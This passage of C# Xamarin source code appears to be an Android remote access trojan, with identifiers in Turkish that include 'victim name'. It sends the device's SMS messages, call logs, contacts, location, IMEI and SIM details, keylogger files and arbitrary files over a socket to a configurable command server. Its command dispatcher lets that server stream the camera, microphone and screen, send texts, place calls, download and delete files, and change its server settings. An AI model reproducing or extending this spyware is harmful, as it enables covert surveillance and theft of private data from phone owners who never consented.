                    string lookupKey = cursor.GetString(0);
                    string name = cursor.GetString(1);

                    if (name == isim)
                    {
                        var uri = Android.Net.Uri.WithAppendedPath(ContactsContract.Contacts.ContentLookupUri, lookupKey);
                        thisContext.ContentResolver.Delete(uri, null, null);
                        cursor.Close();
                        return;
                    }
                }
            }
            catch (Exception) { }
        }
        public void DeleteFile_(string filePath)
        {
            try
            {

                new Java.IO.File(filePath).AbsoluteFile.Delete();
                //Toast.MakeText(this, "DELETED", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message + "DELETE", ToastLength.Long).Show();
            }
        }

        public async void lokasyonCek()
        {
            double GmapLat = 0;
            double GmapLong = 0;
            try
            {
                var request = new GeolocationRequest(GeolocationAccuracy.Default, TimeSpan.FromSeconds(6));
                var location = await Geolocation.GetLocationAsync(request);
                GmapLat = location.Latitude;
                GmapLat = location.Longitude;
                if (location != null)
                {
                    var placemarks = await Geocoding.GetPlacemarksAsync(location.Latitude, location.Longitude);
                    var placemark = placemarks?.FirstOrDefault();
                    string GeoCountryName = "Boş";
                    string admin = "Boş";
                    string local = "Boş";
                    string sublocal = "Boş";
                    string sub2 = "Boş";
                    if (placemark != null)
                    {
                        GeoCountryName = placemark.CountryName;
                        admin = placemark.AdminArea;
                        local = placemark.Locality;
                        sublocal = placemark.SubLocality;
                        sub2 = placemark.SubAdminArea;

                    }
                    try
                    {
                        byte[] dataPacker = MyDataPacker("LOCATION", System.Text.Encoding.UTF8.GetBytes(GeoCountryName + "=" + admin +
                           "=" + sub2 + "=" + sublocal + "=" + local + "=" + location.Latitude.ToString() +
                         "{" + location.Longitude + "="));
                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] dataPacker = MyDataPacker("LOCATION", System.Text.Encoding.UTF8.GetBytes("ERROR: " + ex.Message + "=" +
                                   "ERROR" + "=" + "ERROR" + "=" + "ERROR" + "=" + "ERROR" +
                                "=" + "ERROR" + "=" + "ERROR" + "="));
                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        public void Ac(string path)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(path);
                file.SetReadable(true);
                string application = "";
                string extension = System.IO.Path.GetExtension(path);
                switch (extension.ToLower())
                {
                    case ".txt":
                        application = "text/plain";
                        break;
                    case ".doc":
                    case ".docx":
                        application = "application/msword";
                        break;
                    case ".pdf":
                        application = "application/pdf";
                        break;
                    case ".xls":
                    case ".xlsx":
                        application = "application/vnd.ms-excel";
                        break;
                    case ".jpg":
                    case ".jpeg":
                    case ".png":
                    case ".gif":
                        application = "image/*";
                        break;
                    case ".mp4":
                    case ".3gp":
                    case ".mpg":
                    case ".avi":
                        application = "video/*";
                        break;
                    default:
                        application = "*/*";
                        break;
                }
                Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + path);
                Intent intent = new Intent(Intent.ActionView);
                intent.SetDataAndType(uri, application);
                intent.SetFlags(ActivityFlags.ClearTop);
                StartActivity(intent);
            }
            catch (Exception) { }
        }

        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(ForegroundService._globalService, nereden);
            veri.smsLeriCek();
            string gidecek_veriler = "";
            var sms_ = veri.smsler;
            for (int i = 0; i < sms_.Count; i++)
            {

                string bilgiler = sms_[i].Gonderen + "{" + sms_[i].Icerik + "{"
                + sms_[i].Tarih + "{" + LogVerileri.SMS_TURU + "{" + sms_[i].Isim + "{";

                gidecek_veriler += bilgiler + "&";

            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }

            try
            {
                byte[] dataPacker = MyDataPacker("SMSLOGU", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
            //soketimizeGonder("SMSLOGU", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "=" + list[i].Tarih + "="
                    + list[i].Durasyon + "=" + list[i].Tip + "=");

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
            try
            {
                byte[] dataPacker = MyDataPacker("CAGRIKAYITLARI", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
            //soketimizeGonder("CAGRIKAYITLARI", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = list[i].Isim + "=" + list[i].Numara + "=";

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }

            try
            {
                byte[] dataPacker = MyDataPacker("REHBER", System.Text.Encoding.UTF8.GetBytes(gidecek_veriler));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
            //soketimizeGonder("REHBER", "[VERI]" + gidecek_veriler + "[VERI][0x09]");
        }
        public bool SetKioskMode(bool enable)
        {
            var deviceAdmin =
                new ComponentName(this, Java.Lang.Class.FromType(typeof(AdminReceiver)));
            if (enable)
            {
                var intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, deviceAdmin);
                // intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "activity.getString(R.string.add_admin_extra_app_text");
                StartActivityForResult(intent, RequestCodeEnableAdmin);
                return false;
            }
            else
            {
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                devicePolicyManager.RemoveActiveAdmin(deviceAdmin);
                return true;
            }
        }

        private void PostSetKioskMode(bool enable)
        {
            if (enable)
            {
                var deviceAdmin = new ComponentName(this,
                    Java.Lang.Class.FromType(typeof(AdminReceiver)));
                var devicePolicyManager =
                    (DevicePolicyManager)GetSystemService(DevicePolicyService);
                if (!devicePolicyManager.IsAdminActive(deviceAdmin)) throw new Exception("Not Admin");

                StartLockTask();
            }
            else
            {
                StopLockTask();
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null) where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);
            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }

        public void javaFileWrite(byte[] veri, string yol)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(yol);
                if (file.Exists())
                {
                    file.Delete();
                }
                Java.IO.FileOutputStream fos = new Java.IO.FileOutputStream(file);
                fos.Write(veri);
                fos.Close();
                //fos.Flush();
                fos.Dispose();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, ex.Message, ToastLength.Long)
                //.Show();
            }
        }
        public async void DosyaIndir(string uri, string filename)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/" +
                    filename, await wc.DownloadDataTaskAsync(uri));
                }
                try
                {
                    byte[] dataPacker = MyDataPacker("INDIRILDI", System.Text.Encoding.UTF8.GetBytes("File has successfully downloaded."));
                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
            catch (Exception ex)
            {
                try
                {
                    byte[] dataPacker = MyDataPacker("INDIRILDI", System.Text.Encoding.UTF8.GetBytes(ex.Message));
                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        public string fetchAllInfo()
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            sb.Append("#------------[Device Info]------------#<");
            try { sb.Append("Device Name: " + Settings.System.GetString(ContentResolver, "device_name") + "<"); ; } catch (Exception) { }
            try { sb.Append("Model: " + Build.Model + "<"); ; } catch (Exception) { }
            try
            {
                sb.Append("Board: " + Build.Board + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Brand: " + Build.Brand + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Bootloader: " + Build.Bootloader + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Device: " + Build.Device + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Display: " + Build.Display + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Fingerprint: " + Build.Fingerprint + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Hardware: " + Build.Hardware + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("HOST: " + Build.Host + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("ID: " + Build.Id + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Manufacturer: " + Build.Manufacturer + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Product: " + Build.Product + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Serial: " + Build.Serial + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Tags: " + Build.Tags + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("User: " + Build.User + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Time: " + DateTime.Now.ToString("HH:mm") + "<");
            }
            catch (Exception) { }
            sb.Append("#------------[System info]------------#<");
            try
            {
                sb.Append("Release: " + Build.VERSION.Release + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("SDK_INT: " + Build.VERSION.SdkInt + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Language: " + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName + "<");
            }
            catch (Exception) { }
            try
            {
                sb.Append("Time: " + DateTime.Now.ToString("dddd, dd MMMM yyyy") + "<");
            }
            catch (Exception) { }
            sb.Append("#------------[Sim Info]------------#<");
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).DeviceId;
                sb.Append("IMEI: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimSerialNumber;
                sb.Append("Sim Serial Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperator;
                sb.Append("Sim Operator: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimOperatorName;
                sb.Append("Sim Operator Name: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).Line1Number;
                sb.Append("Line Number: " + str + "<");
            }
            catch (Exception) { }
            try
            {
                string str = ((TelephonyManager)GetSystemService("phone")).SimCountryIso;
                sb.Append("Sim CountryIso: " + str + "<");
            }
            catch (Exception) { }
            return sb.ToString();
        }

        public async void DosyaGonder(string ayir)
        {
            await Task.Run(async () =>
            {
                try
                {
                    Socket sendFile = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                    sendFile.ReceiveTimeout = -1; sendFile.SendTimeout = -1;
                    IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                    IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                    SetKeepAlive(sendFile, 2000, 1000);
                    sendFile.SendBufferSize = int.MaxValue;
                    sendFile.NoDelay = true;
                    sendFile.Connect(endpoint_dosya);

                    MemoryStream ms = new MemoryStream();
                    byte[] dosya = File.ReadAllBytes(ayir);

                    using (MemoryStream from = new MemoryStream(dosya))
                    {
                        int readCount;
                        byte[] buffer = new byte[4096];
                        while ((readCount = from.Read(buffer, 0, 4096)) != 0)
                        {
                            try
                            {
                                ms.Write(buffer, 0, readCount);
                                byte[] pack = MyDataPacker("UZUNLUK", ms.ToArray(), $"[VERI]{dosya.Length}[VERI]{ayir.Substring(ayir.LastIndexOf("/") + 1) + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier()}");
                                sendFile.Send(pack, 0, pack.Length, SocketFlags.None);
                                ms.Flush(); ms.Close(); ms.Dispose(); ms = new MemoryStream();
                                await Task.Delay(25); //reduce high cpu usage and lighten socket traffic.
                            }
                            catch { break; }
                        }

                    }

                    if (sendFile != null)
                    {
                        try { sendFile.Close(); } catch { }
                        try { sendFile.Dispose(); } catch { }
                        GC.SuppressFinalize(sendFile);
                    }

                    if (ms != null) { ms.Flush(); ms.Close(); ms.Dispose(); }
                    dosya = new byte[] { };
                    GC.Collect();
                }
                catch (Exception)
                {

                }
            });
        }
        private void Soketimizdan_Gelen_Veriler(string tag, byte[] dataBuff)
        {
            RunOnUiThread(() =>
            {
                try
                {
                    switch (tag.Split('|')[0])
                    {
                        case "<DOWNFILE>":
                            string[] ayir_ = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            DosyaIndir(ayir_[1], ayir_[2]);
                            break;

                        case "<FOCUSELIVE>":
                            Android.Hardware.Camera.Parameters pr_ = Prev.mCamera.GetParameters();
                            IList<string> supportedFocusModes = pr_.SupportedFocusModes;
                            if (supportedFocusModes != null)
                            {
                                if (System.Text.Encoding.UTF8.GetString(dataBuff) == "1")
                                {
                                    if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeContinuousVideo))
                                    {
                                        //Toast.MakeText(this, "FOCUS VIDEO", ToastLength.Long).Show();
                                        pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeContinuousVideo;
                                    }
                                }
                                else
                                {
                                    if (supportedFocusModes.Contains(Android.Hardware.Camera.Parameters.FocusModeAuto))
                                    {
                                        //Toast.MakeText(this, "FOCUS AUTO", ToastLength.Long).Show();
                                        pr_.FocusMode = Android.Hardware.Camera.Parameters.FocusModeAuto;
                                    }
                                }
                                Prev.mCamera.SetParameters(pr_);
                            }
                            break;

                        case "<LIVESTREAM>":
                            string[] camera = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            string kamera = camera[1];
                            string flashmode = camera[2];
                            string cozunurluk = camera[3];
                            MainValues.quality = camera[4];
                            string focus = camera[5];
                            Prev.global_cam.StartCamera(int.Parse(kamera), flashmode, cozunurluk, focus);
                            break;

                        case "<LIVEFLASH>":
                            Android.Hardware.Camera.Parameters pr = Prev.mCamera.GetParameters();
                            IList<string> flashmodlari = pr.SupportedFlashModes;
                            if (flashmodlari != null)
                            {
                                if (System.Text.Encoding.UTF8.GetString(dataBuff) == "1")
                                {
                                    if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeTorch))
                                    {
                                        pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeTorch;
                                    }
                                    else if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeRedEye))
                                    {
                                        pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeRedEye;
                                    }
                                }
                                else
                                {
                                    if (flashmodlari.Contains(Android.Hardware.Camera.Parameters.FlashModeOff))
                                    {
                                        pr.FlashMode = Android.Hardware.Camera.Parameters.FlashModeOff;
                                    }
                                }
                                Prev.mCamera.SetParameters(pr);
                            }
                            break;

                        case "<QUALITY>":
                            MainValues.quality = System.Text.Encoding.UTF8.GetString(dataBuff);
                            break;

                        case "<LIVESTOP>":
                            Prev.global_cam.StopCamera();
                            byte[] pack = MyDataPacker("CAMREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                            Soketimiz.BeginSend(pack, 0, pack.Length, SocketFlags.None, null, null);
                            break;

                        case "<ZOOM>":
                            Android.Hardware.Camera.Parameters _pr_ = Prev.mCamera.GetParameters();
                            if (_pr_.IsZoomSupported)
                            {
                                try
                                {
                                    _pr_.Zoom = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff));
                                    Prev.mCamera.SetParameters(_pr_);
                                }
                                catch (Exception) { }
                            }
                            break;

                        case "<CAMHAZIRLA>":
                            if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
                            {
                                kameraCozunurlukleri();
                            }
                            else
                            {
                                try
                                {
                                    byte[] dataPacker = MyDataPacker("NOCAMERA", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                                }
                                catch (Exception) { }
                            }
                            break;

                        case "<DOSYABYTE>":
                            try
                            {
                                string[] ayristiraga = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                Upload ipo = new Upload(ayristiraga[0], ayristiraga[1], ayristiraga[2], MainValues.KRBN_ISMI + "_" + GetIdentifier(), ayristiraga[3]);
                                upList.Add(ipo);
                            }
                            catch (Exception) { }
                            break;
                        case "<DELETE>":
                            try { DeleteFile_(System.Text.Encoding.UTF8.GetString(dataBuff)); } catch (Exception) { }
                            break;
                        case "<BLUETOOTH>":
                            btKapaAc(Convert.ToBoolean(System.Text.Encoding.UTF8.GetString(dataBuff)));
                            break;
                        case "<CALLLOGS>":
                            telefonLogu();
                            break;
                        case "<PRE>":
                            preview(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<WIFI>":
                            wifiAcKapa(Convert.ToBoolean(System.Text.Encoding.UTF8.GetString(dataBuff)));
                            break;
                        case "<ANASAYFA>":
                            try
                            {
                                Intent i = new Intent(Intent.ActionMain);
                                i.AddCategory(Intent.CategoryHome);
                                i.SetFlags(ActivityFlags.NewTask);
                                StartActivity(i);
                            }
                            catch (Exception) { }
                            break;

                        case "<GELENKUTUSU>":
                            smsLogu("gelen");
                            break;

                        case "<GIDENKUTUSU>":
                            smsLogu("giden");
                            break;

                        case "<KONUS>":
                            konus(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;

                        case "<CAM>":
                            string[] mydata = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            MainValues.front_back = mydata[1];
                            MainValues.flashMode = mydata[2];
                            MainValues.resolution = mydata[3];
                            kameraCek(Soketimiz);
                            break;

                        case "<DOSYA>":
                            dosyalar();
                            break;

                        case "<FOLDERFILE>":
                            allDirectory_ = new List<string>();
                            sonAsama(System.Text.Encoding.UTF8.GetString(dataBuff));
                            cihazDosyalariGonder();
                            break;

                        case "<FILESDCARD>":
                            allDirectory_ = new List<string>();
                            listf(System.Text.Encoding.UTF8.GetString(dataBuff));
                            dosyalariGonder();
                            break;

                        case "<INDIR>":
                            try
                            {
                                DosyaGonder(System.Text.Encoding.UTF8.GetString(dataBuff));
                            }
                            catch (Exception) { }
                            break;

                        case "<MIC>":
                            string[] micdata = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            switch (micdata[1])
                            {
                                case "BASLA":
                                    micSend(micdata[2], micdata[3]);
                                    break;
                                case "DURDUR":
                                    micStop();
                                    break;
                            }
                            break;

                        case "<KEYBASLAT>":
                            key_gonder = true;
                            break;

                        case "<KEYDUR>":
                            key_gonder = false;
                            break;

                        case "<LOGLARIHAZIRLA>":
                            log_dosylari_gonder = "";
                            DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                            if (fileInfos.Length > 0)
                            {
                                foreach (FileInfo fileInfo in fileInfos)
                                {
                                    log_dosylari_gonder += fileInfo.Name + "=";
                                }
                                try
                                {
                                    byte[] dataPacker = MyDataPacker("LOGDOSYA", System.Text.Encoding.UTF8.GetBytes(log_dosylari_gonder));
                                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                                }
                                catch (Exception) { }
                            }
                            else
                            {
                                try
                                {
                                    byte[] dataPacker = MyDataPacker("LOGDOSYA", System.Text.Encoding.UTF8.GetBytes("LOG_YOK"));
                                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                                }
                                catch (Exception) { }
                            }
                            break;

                        case "<KEYCEK>":
                            string icerik = File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + System.Text.Encoding.UTF8.GetString(dataBuff)).Replace(System.Environment.NewLine, "[NEW_LINE]");
                            try
                            {
                                byte[] dataPacker = MyDataPacker("KEYGONDER", System.Text.Encoding.UTF8.GetBytes(icerik));
                                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                            }
                            catch (Exception) { }
                            break;

                        case "<DOSYAAC>":
                            Ac(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;

                        case "<GIZLI>":
                            StartPlayer(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<GIZKAPA>":
                            if (player != null)
                            {
                                player.Stop();
                            }
                            break;

                        case "<VOLUMELEVELS>":
                            sesBilgileri();
                            break;

                        case "<ZILSESI>":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "<MEDYASESI>":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "<BILDIRIMSESI>":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;

                        case "<REHBERIVER>":
                            rehberLogu();
                            break;

                        case "<REHBERISIM>":
                            string[] ayir = System.Text.Encoding.UTF8.GetString(dataBuff).Split('=');
                            rehberEkle(ayir[1], ayir[0]);
                            break;

                        case "<REHBERSIL>":
                            rehberNoSil(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<VIBRATION>":
                            try
                            {
                                Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                vibrator.Vibrate(int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff)));
                            }
                            catch (Exception) { }
                            break;

                        case "<FLASH>":
                            flashIsik(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<TOST>":
                            Toast.MakeText(this, System.Text.Encoding.UTF8.GetString(dataBuff), ToastLength.Long).Show();
                            break;
                        case "<APPLICATIONS>":
                            uygulamalar();
                            break;

                        case "<OPENAPP>":
                            try
                            {
                                Intent intent = PackageManager.GetLaunchIntentForPackage(System.Text.Encoding.UTF8.GetString(dataBuff));
                                intent.AddFlags(ActivityFlags.NewTask);
                                StartActivity(intent);
                            }
                            catch (Exception) { }
                            break;
                        case "<DELETECALL>":
                            DeleteCallLogByNumber(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;

                        case "<SARJ>":
                            try
                            {
                                var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                var battery = RegisterReceiver(null, filter);
                                int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                int BPercetage = (int)Math.Floor(level * 100D / scale);
                                var per = BPercetage.ToString();

                                try
                                {
                                    byte[] dataPacker = MyDataPacker("TELEFONBILGI", System.Text.Encoding.UTF8.GetBytes("[VERI]" + per.ToString() + "[VERI]" + ekranDurumu() + "[VERI]" + usbDurumu()
                                 + "[VERI]" + mobil_Veri() + "[VERI]" + wifi_durumu() + "[VERI]" + gps_durum() + "[VERI]" + btisEnabled() + "[VERI]" + fetchAllInfo()));
                                    Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                                }
                                catch (Exception) { }
                            }
                            catch (Exception) { }
                            break;

                        case "<UPDATE>":
                            try
                            {
                                string[] myd = System.Text.Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                                Preferences.Set("aypi_adresi", myd[2]);
                                Preferences.Set("port", myd[3]);
                                Preferences.Set("kurban_adi", myd[1]);
                                Preferences.Set("pass", myd[4]);
                                PASSWORD = Preferences.Get("pass", string.Empty);
                                MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
                                MainValues.port = int.Parse(Preferences.Get("port", "9999"));
                                MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "xxxx");
                            }
                            catch (Exception) { }
                            break;

                        case "<WALLPAPERBYTE>":
                            try
                            {
                                duvarKagidi(System.Text.Encoding.UTF8.GetString(dataBuff));
                            }
                            catch (Exception) { }
                            break;
                        case "<WALLPAPERGET>":
                            duvarKagidiniGonder();
                            break;
                        case "<PANOGET>":
                            panoyuYolla();
                            break;
                        case "<PANOSET>":
                            panoAyarla(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<SMSGONDER>":
                            string[] baki = System.Text.Encoding.UTF8.GetString(dataBuff).Split('=');
                            try
                            {
                                SmsManager.Default.SendTextMessage(baki[0], null,
                                       baki[1], null, null);
                            }
                            catch (Exception) { }
                            break;
                        case "<ARA>":
                            MakePhoneCall(System.Text.Encoding.UTF8.GetString(dataBuff));
                            break;
                        case "<URL>":
                            try
                            {
                                var uri = Android.Net.Uri.Parse(System.Text.Encoding.UTF8.GetString(dataBuff));
                                var intent = new Intent(Intent.ActionView, uri);
                                StartActivity(intent);
                            }
                            catch (Exception) { }
                            break;
                        case "<KONUM>":
                            lokasyonCek();
                            break;
                        case "<PARLAKLIK>":
                            try { setBrightness(int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff))); } catch (Exception) { }
                            break;
                        case "<LOGTEMIZLE>":
                            DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                            if (fileInfos_.Length > 0)
                            {
                                foreach (FileInfo fileInfo in fileInfos_)
                                {
                                    fileInfo.Delete();
                                }
                            }
                            break;

                        case "<SHORTCUT>":
                            string[] shrt = tag.Split('|')[2].Replace(">", "").Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                            AddShortcut(shrt[0], shrt[1], dataBuff);
                            break;

                        case "<SCREENLIVEOPEN>":
                            ImageAvailableListener.kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                            startProjection();
                            break;
                        case "<SCREENLIVECLOSE>":
                            stopProjection();
                            break;
                        case "<SCREENQUALITY>":
                            ImageAvailableListener.kalite = int.Parse(System.Text.Encoding.UTF8.GetString(dataBuff).Replace("%", ""));
                            break;
                        case "<CONCLOSE>":
                            CLOSE_CONNECTION = true;
                            break;
                        case "<UNINSTALL>":
                            Uninstall();
                            break;
                    }
                }
                catch (Exception) { }
            });
        }
        public string GetIdentifier()
        {
            try
            {
                return Settings.Secure.GetString(ContentResolver, Settings.Secure.AndroidId);
            }
            catch (Exception) { return "error_imei"; }
        }
        public string telefondanIsim(string telefon)
        {
            try
            {
                return getContactbyPhoneNumber(this, telefon);
            }
            catch (Exception) { return "Kayıtsız numara"; }
        }
        public string getContactbyPhoneNumber(Context c, string phoneNumber)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(ContactsContract.PhoneLookup.ContentFilterUri, (phoneNumber));
                string[] projection = { ContactsContract.Contacts.InterfaceConsts.DisplayName };
                ICursor cursor = c.ContentResolver.Query(uri, projection, null, null, null);
                if (cursor == null)
                {
                    return phoneNumber;
                }
                else
                {
                    string name = phoneNumber;
                    try
                    {

                        if (cursor.MoveToFirst())
                        {
                            name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                        }
                    }
                    finally
                    {
                        cursor.Close();
                    }

                    return name;
                }
            }
            catch (Exception) { return "İsim bulunamadı"; }
        }
        public void cihazDosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_.ToList())
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]CIHAZ[VERI]" + dosyalarS));
